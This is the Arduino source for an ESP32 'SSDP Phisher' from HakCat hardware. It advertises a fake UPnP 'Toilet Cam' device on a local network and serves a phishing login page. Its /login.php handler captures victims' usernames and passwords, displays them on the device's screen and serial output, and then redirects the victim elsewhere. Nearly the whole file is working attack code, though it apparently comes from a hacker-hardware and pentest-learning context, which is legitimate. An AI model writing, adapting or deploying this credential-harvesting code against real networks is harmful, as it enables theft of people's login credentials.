/* WiFi Nugget SSDP Phishing, 2022
 * https://github.com/HakCat-Tech/Nugget-SSDP
 *  
 * by Alex Lynd & HakCat Hardware
 * https://hakcat.com
 */

// include libraries
#include "ESPAsyncWebServer.h"
#include "ESP32SSDP.h"
#include "webserver.h"
#include "SH1106Wire.h"
#include "graphics.h"
#include <Adafruit_NeoPixel.h>

// initialize NeoPixel & Display
Adafruit_NeoPixel strip {1, 12, NEO_GRB + NEO_KHZ800 };
SH1106Wire display(0x3C, 33, 35);

// WiFi credentials
const char* ssid = "WiFi";
const char* password = "password";

// start webserver
AsyncWebServer webserver(80);
extern String index_html;
String hostname = "Toilet Cam";

void setup() {
    Serial.begin(115200);

    // initialize screen parameters and display starting page
    display.init();
    display.flipScreenVertically();
    display.setTextAlignment(TEXT_ALIGN_LEFT);
    display.setFont(DejaVu_Sans_Mono_10);

    display.clear();
    display.drawXbm(0,0,128,64,reload_bits);
    display.drawString(3,15, "Waiting for ");
    display.drawString(3,25,"victim...");
    display.drawLine(0,53,127,53);
    display.drawLine(0,54,127,54);
    display.drawString(0,54,"NUGGET SSDP PHISHER");
    display.display();
    
    // GREEN NeoPixel 
    strip.begin(); strip.clear(); strip.show();
    strip.setPixelColor(0, strip.Color(0,255, 0)); strip.show();
    strip.setBrightness(100);

    // start WiFi!
    Serial.println();
    Serial.println("Starting WiFi...");

    WiFi.mode(WIFI_STA);
    WiFi.begin(ssid, password);

    // set custom hostname and start webserver links
    WiFi.setHostname(hostname.c_str());
    if(WiFi.waitForConnectResult() == WL_CONNECTED) {

        Serial.printf("Starting HTTP...\n");
        
        /********** Phishing page **********/
        webserver.on("/index.html", HTTP_GET, [&](AsyncWebServerRequest *request) {
          
        display.clear();
        display.drawXbm(0,0,128,64,medium_signal_bits);
        display.drawString(3,15, "Victim");
        display.drawString(3,25,"logging in");
        display.drawLine(0,53,127,53);
        display.drawLine(0,54,127,54);
        display.drawString(0,54,"NUGGET SSDP PHISHER");
        display.display();
        strip.setPixelColor(0, strip.Color(0,0, 255)); strip.show(); strip.show();
            request->send(200, "text/html", index_html);
        });

        /********** Redirect Page **********/
        webserver.on("/login.php", HTTP_POST, [&](AsyncWebServerRequest *request) {

        String username = request->getParam("username", true)->value() ;
        String password = request->getParam("password", true)->value() ;
        
        display.clear();
        display.drawXbm(0,0,128,64,high_signal_bits);
        display.drawString(0,5, "Creds found!");
        display.drawString(0,20,"User:"+username);
        display.drawString(0,30,"Pass:"+password);
        display.drawLine(0,53,127,53);
        display.drawLine(0,54,127,54);
        display.drawString(0,54,"NUGGET SSDP PHISHER");
        display.display();
        strip.setPixelColor(0, strip.Color(255,0, 0)); strip.show(); strip.show();
        
        Serial.println("****************************\nUSER CREDENTIALS:\n****************************");
        Serial.print("Username: "); Serial.println(username);
        Serial.print("Password: "); Serial.println(password);
        
        request->redirect("http://doogle.com");
        });
        
        /********** SSDP Description **********/
        webserver.on("/description.xml", HTTP_GET, [&](AsyncWebServerRequest *request) {
            request->send(200, "text/xml", SSDP.schema(false));
        });
        
        webserver.on("/", HTTP_GET, [&](AsyncWebServerRequest *request) {
            request->redirect("/index.html");
        });
        webserver.begin();

        //set schema xml url, nees to match http handler
        //"ssdp/schema.xml" if not set
        SSDP.setSchemaURL("description.xml");
        //set port
        //80 if not set
        SSDP.setHTTPPort(80);
        //set device name
        //Null string if not set
        SSDP.setName("Toilet Came");
        //set Serial Number
        //Null string if not set
        SSDP.setSerialNumber("001788102201");
        //set device url
        //Null string if not set
        SSDP.setURL("index.html");
        //set model name
        //Null string if not set
        SSDP.setModelName("Toilet Cam Model 2600");
        //set model description
        //Null string if not set
        SSDP.setModelDescription("This device can be controled by WiFi");
        //set model number
        //Null string if not set
        SSDP.setModelNumber("929000226503");
        //set model url
        //Null string if not set
        SSDP.setModelURL("http://www.doogle.com");
        //set model manufacturer name
        //Null string if not set
        SSDP.setManufacturer("National Security Agency");
        //set model manufacturer url
        //Null string if not set
        SSDP.setManufacturerURL("http://www.NSA.gov");
        //set device type
        //"urn:schemas-upnp-org:device:Basic:1" if not set
        SSDP.setDeviceType("rootdevice"); //to appear as root device, other examples: MediaRenderer, MediaServer ...
        //set server name
        //"Arduino/1.0" if not set
        SSDP.setServerName("SSDPServer/1.0");
        //set UUID, you can use https://www.uuidgenerator.net/
        //use 38323636-4558-4dda-9188-cda0e6 + 4 last bytes of mac address if not set
        //use SSDP.setUUID("daa26fa3-d2d4-4072-bc7a-a1b88ab4234a", false); for full UUID
        SSDP.setUUID("daa26fa3-d2d4-4072-bc7a");
        //Set icons list, NB: optional, this is ignored under windows
        SSDP.setIcons(  "<icon>"
                        "<mimetype>image/png</mimetype>"
                        "<height>48</height>"
                        "<width>48</width>"
                        "<depth>24</depth>"
                        "<url>icon48.png</url>"
                        "</icon>");
        //Set service list, NB: optional for simple device
        SSDP.setServices(  "<service>"
                           "<serviceType>urn:schemas-upnp-org:service:SwitchPower:1</serviceType>"
                           "<serviceId>urn:upnp-org:serviceId:SwitchPower:1</serviceId>"
                           "<SCPDURL>/SwitchPower1.xml</SCPDURL>"
                           "<controlURL>/SwitchPower/Control</controlURL>"
                           "<eventSubURL>/SwitchPower/Event</eventSubURL>"
                           "</service>");

        Serial.printf("Starting SSDP...\n");
        SSDP.begin();

        Serial.printf("Ready!\n");
    } else {
        Serial.printf("WiFi Failed\n");
        while(1) {
            delay(100);
        }
    }
}

void loop() {
    delay(1);
}
